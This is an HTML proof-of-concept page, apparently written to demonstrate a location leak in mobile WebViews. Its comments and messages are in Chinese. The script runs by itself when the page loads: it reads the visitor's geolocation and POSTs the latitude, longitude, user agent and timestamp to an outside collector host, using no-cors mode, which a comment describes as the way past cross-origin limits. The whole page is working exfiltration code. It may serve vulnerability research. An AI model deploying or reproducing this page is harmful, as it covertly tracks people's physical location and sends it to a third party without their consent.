<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>WebView Location Leak POC</title>
</head>
<body>
<h1>正在获取定位并上传...</h1>
<script>
// 目标接收地址
const UPLOAD_URL = "https://c47rsjwv.eyes.sh/receive";

function uploadLocation(lat, lon) {
    const data = {
        type: "webview_location_leak",
        latitude: lat,
        longitude: lon,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };

    // 发送定位到远程服务器
    fetch(UPLOAD_URL, {
        method: "POST",
        mode: "no-cors", // 关键：绕过跨域，WebView 必通
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    }).then(() => {
        alert("定位已上传成功！\n纬度：" + lat + "\n经度：" + lon);
    }).catch(() => {
        alert("定位获取成功，上传失败（可能服务器未监听）\n" +
              "经纬度：" + lat + ", " + lon);
    });
}

// 获取定位并上传
function getAndSendLocation() {
    if (!navigator.geolocation) {
        alert("设备不支持定位");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            uploadLocation(lat, lon);
        },
        (err) => {
            alert("定位失败：" + err.message);
        }
    );
}

// 页面加载自动执行
window.onload = () => {
    setTimeout(getAndSendLocation, 500);
};
</script>
</body>
</html>
